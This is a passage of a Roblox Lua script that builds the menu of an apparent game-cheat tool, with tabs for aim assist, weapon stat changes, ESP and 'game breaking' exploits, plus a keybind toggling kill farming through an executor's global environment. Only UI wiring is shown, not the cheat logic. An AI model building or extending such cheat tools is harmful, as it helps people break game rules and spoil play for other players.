        for _, r in ipairs(content:GetDescendants()) do
            if r:IsA("Frame") and r:FindFirstChild("Track") then
                local fill = r.Track:FindFirstChild("Fill")
                if fill then fill.BackgroundColor3 = a end
            end
        end
        return nil
    end

    -- gives each row its behavior based on its RowType attribute
    -- sort of like a sorting hat but for ui elements
    local function wireRow(r)
        local wtype = r:GetAttribute("RowType")
        local key   = r:GetAttribute("Key")

        -- rows light up when you visit them. its the least we can do ig? honestly they should be grateful
        local base = r.BackgroundColor3
        r.MouseEnter:Connect(function()
            TS:Create(r, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(26, 26, 38) }):Play()
        end)
        r.MouseLeave:Connect(function()
            TS:Create(r, TweenInfo.new(0.15), { BackgroundColor3 = base }):Play()
        end)

        if wtype == "Toggle" then
            -- flip it flip it good
            local st = r:GetAttribute("Default") or false
            local trk = r:WaitForChild("Track")
            local fl = trk:WaitForChild("Fill")
            local knob = trk:WaitForChild("Knob")
            local btn = r:WaitForChild("Hit")
            local function vis(animated)
                local gF = UDim2.fromScale(st and 1 or 0, 1)
                local gP = st and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
                if animated then
                    TS:Create(fl,   TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = gF }):Play()
                    TS:Create(knob, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = gP }):Play()
                else
                    fl.Size = gF; knob.Position = gP
                end
            end
            btn.MouseButton1Click:Connect(function()
                -- the sacred flip. centuries of tradition
                st = not st
                vis(true)
                if key then state[key] = st end
            end)

        elseif wtype == "TextBox" then
            -- type a number, we believes in you
            local t = r:WaitForChild("Value")
            t.FocusLost:Connect(function()
                -- trust but verify, and by verify i mean tonumber
                local v = tonumber(t.Text)
                if v and key then state[key] = v end
            end)

        elseif wtype == "Cycler" then
            -- round and round the option goes, where it stops nobody knows oooooo
            local b = r:WaitForChild("Value")
            local options = {}
            for opt in string.gmatch(r:GetAttribute("Options") or "", "[^,]+") do
                table.insert(options, opt)
            end
            local current = r:GetAttribute("Default")
            b.MouseButton1Click:Connect(function()
                -- next! (like a deli counter but for options)
                local i = 1
                for k, o in ipairs(options) do if o == current then i = k; break end end
                i = i % #options + 1
                current = options[i]
                b.Text = current .. " >"
                if key then state[key] = current end
            end)

        elseif wtype == "Slider" then
            -- this one goes left and right. revolutionary i know
            local trk = r:WaitForChild("Track")
            local fl = trk:WaitForChild("Fill")
            local vl = r:WaitForChild("ValueLabel")
            local btn = trk:WaitForChild("Hit")
            local dragging = false
            -- held hostage until further notice
            btn.InputBegan:Connect(function(i)
                if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end
            end)
            UIS.InputChanged:Connect(function(i)
                if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
                    local pos = math.clamp((i.Position.X - trk.AbsolutePosition.X) / trk.AbsoluteSize.X, 0, 1)
                    local v = math.floor(pos * 255)
                    fl.Size = UDim2.new(pos, 0, 1, 0)
                    vl.Text = tostring(v)
                    if key then state.theme[key] = v end
                    applytheme()
                end
            end)
            UIS.InputEnded:Connect(function(i)
                -- release the hostage (RAH)
                if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
            end)

        elseif wtype == "ThemeButton" then
            -- press shiny button, receive shiny colors right guys?
            local b = r:WaitForChild("Apply")
            b.MouseEnter:Connect(function() TS:Create(b, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(40, 40, 52) }):Play() end)
            b.MouseLeave:Connect(function() TS:Create(b, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(25, 25, 32) }):Play() end)
            b.MouseButton1Click:Connect(function()
                -- congratulations, you have chosen violence (the pretty kind)
                state.theme.accentr = b:GetAttribute("R")
                state.theme.accentg = b:GetAttribute("G")
                state.theme.accentb = b:GetAttribute("B")
                applytheme()
            end)
        end
    end

    for _, r in ipairs(content:GetDescendants()) do
        if r:IsA("Frame") and r:GetAttribute("RowType") then
            -- every row gets a job. no freeloaders in this economy
            wireRow(r)
        end
    end

    -- tab definitions
    -- the five flavors of mischief
    local tabs = {
        { b = "TabAim", pg = "PgAim", t = "AIM ASSIST", s = "Configure aim settings",  idx = 0 },
        { b = "TabWep", pg = "PgWep", t = "WEAPON",     s = "Modify weapon stats",     idx = 1 },
        { b = "TabVis", pg = "PgVis", t = "VISUALS",    s = "ESP and visual changes",  idx = 2 },
        { b = "TabExp", pg = "PgExp", t = "EXPLOITS",   s = "Game breaking features",  idx = 3 },
        { b = "TabThm", pg = "PgThm", t = "THEMES",     s = "UI color customization",  idx = 4 },
    }

    local function selecttab(sel)
        -- pick your poison traveler
        for _, tab in ipairs(tabs) do
            local on = tab == sel
            local pg = content:FindFirstChild(tab.pg)
            local b = side:FindFirstChild(tab.b)
            if pg then pg.Visible = on end
            if b then
                b:SetAttribute("Active", on)
                TS:Create(b, TweenInfo.new(0.15), {
                    BackgroundColor3 = on and Color3.fromRGB(24, 24, 34) or Color3.fromRGB(14, 14, 20),
                    TextColor3      = on and Color3.fromRGB(235, 235, 245) or Color3.fromRGB(160, 160, 175),
                }):Play()
            end
        end
        TS:Create(tabIndicator, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = UDim2.new(0, 8, 0, 38 + sel.idx * 32),
        }):Play()
        head.Text = sel.t
        sub.Text  = sel.s
        applytheme()
    end

    for _, tab in ipairs(tabs) do
        local b = side:FindFirstChild(tab.b)
        if b then
            b.MouseEnter:Connect(function()
                if not b:GetAttribute("Active") then
                    TS:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(20, 20, 28) }):Play()
                end
            end)
            b.MouseLeave:Connect(function()
                if not b:GetAttribute("Active") then
                    TS:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(14, 14, 20) }):Play()
                end
            end)
            b.MouseButton1Click:Connect(function() selecttab(tab) end)
        end
    end
    selecttab(tabs[1])

    local minimized = false
    local origSize = main.Size
    -- remember the size, we may need it later. or not. who knows
    minBtn.MouseEnter:Connect(function() TS:Create(minBtn, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(40, 40, 52) }):Play() end)
    minBtn.MouseLeave:Connect(function() TS:Create(minBtn, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(25, 25, 32) }):Play() end)
    minBtn.MouseButton1Click:Connect(function()
        -- shrinko mode, the window takes a lil nap
        minimized = not minimized
        local goal = minimized
            and UDim2.new(origSize.X.Scale, origSize.X.Offset, 0, 32)
            or  origSize
        TS:Create(main, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = goal }):Play()
        minBtn.Text = minimized and "+" or "_"
    end)

    -- pick up the window and YEET it wherever your heart desires
    local dragging, dragstart, startpos = false, nil, nil
    top.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging, dragstart, startpos = true, i.Position, main.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            -- the window follows the mouse like a lost puppy
            local d = i.Position - dragstart
            main.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + d.X, startpos.Y.Scale, startpos.Y.Offset + d.Y)
        end
    end)

    applytheme()

    -- AAAAA
    local ms = main:FindFirstChild("MainScale")
    if ms then
        ms.Scale = 0.9
        TS:Create(ms, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
    end
    -- literally. an actual ta-da. we do not joke about entrances and the intro
    local tada = gui:FindFirstChild("TadaSound")
    if tada then
        tada:Play()
    end
    -- and thus concludes the wiring. the ui lives. it ALIVE
    -- nyeheheheh
end
coroutine.wrap(PLGJ_fake_script)()

addc(uin.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Zero then
        local nv = not cfg.farmkills
        cfg.farmkills = nv
        if getgenv().sphui_state then getgenv().sphui_state.farmkills = nv end
        if getgenv().sph_update_ui then pcall(getgenv().sph_update_ui, "farmkills", nv) end
    end
end))
